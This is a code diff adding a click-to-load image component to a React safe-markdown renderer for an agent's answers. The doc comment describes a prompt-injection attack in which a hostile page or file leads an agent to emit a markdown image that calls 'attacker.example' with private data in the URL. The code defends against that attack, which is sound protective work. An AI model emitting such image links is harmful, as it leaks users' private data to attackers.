@@ -1,3 +1,5 @@
+import { Image as ImageIcon } from 'lucide-react';
+import { useState } from 'react';
 import ReactMarkdown, { defaultUrlTransform } from 'react-markdown';
 import rehypeSanitize, { defaultSchema } from 'rehype-sanitize';
 import remarkGfm from 'remark-gfm';
@@ -132,6 +134,42 @@ const TABLE_WRAPPER_CLASS = 'my-2 max-w-full overflow-x-auto rounded-card border
 const TABLE_CLASS = 'w-full border-separate border-spacing-0 text-xs leading-snug';
 
 /**
+ * An image in an agent's answer, loaded only when you click it. Loading it on
+ * sight would let whoever controls the link learn what's in its URL: an agent
+ * that read a hostile page or file can be told to write
+ * `![](https://attacker.example/?d=<something private>)`, and every member
+ * whose app shows the answer would send it just by looking. An inline
+ * `data:` image goes nowhere, so it shows at once.
+ */
+function ClickToLoadImage({ src, alt }: { src?: string; alt?: string }) {
+  const [loaded, setLoaded] = useState(false);
+  if (!src) return null;
+  if (src.startsWith('data:image/') || loaded) {
+    return <img src={src} alt={alt ?? ''} referrerPolicy="no-referrer" className="my-1 max-w-full rounded-control" />;
+  }
+  let host = '';
+  try {
+    host = new URL(src).hostname;
+  } catch {
+    // Not a web address: nothing to load.
+    return alt ? <span>{alt}</span> : null;
+  }
+  return (
+    <button
+      type="button"
+      onClick={() => setLoaded(true)}
+      title={src}
+      className="border-border-hairline bg-bg-1 hover:bg-bg-2 inline-flex max-w-full items-center gap-1.5 rounded-control border px-2 py-1 align-middle text-xs text-text-secondary"
+      data-testid="markdown-image-placeholder"
+    >
+      <ImageIcon className="size-3.5 shrink-0" strokeWidth={1.5} />
+      <span className="min-w-0 truncate">{alt || 'Image'}</span>
+      <span className="text-text-muted shrink-0">· {host} · Load</span>
+    </button>
+  );
+}
+
+/**
  * The reusable safe-markdown stack itself — react-markdown + remark-gfm +
  * rehype-sanitize (no rehype-raw), links intercepted and handed to
  * `rpc.app.openExternal` rather than navigating the renderer. Pulled out of
@@ -160,6 +198,7 @@ export function SafeMarkdown({
         rehypePlugins={[[rehypeSanitize, onOpenPath ? FILE_LINK_SANITIZE_SCHEMA : SANITIZE_SCHEMA]]}
         urlTransform={onOpenPath ? fileLinkUrlTransform : urlTransform}
         components={{
+          img: ({ src, alt }) => <ClickToLoadImage src={typeof src === 'string' ? src : undefined} alt={alt} />,
           table: ({ children }) => (
             <div className={TABLE_WRAPPER_CLASS}>
               <table className={TABLE_CLASS}>{children}</table>
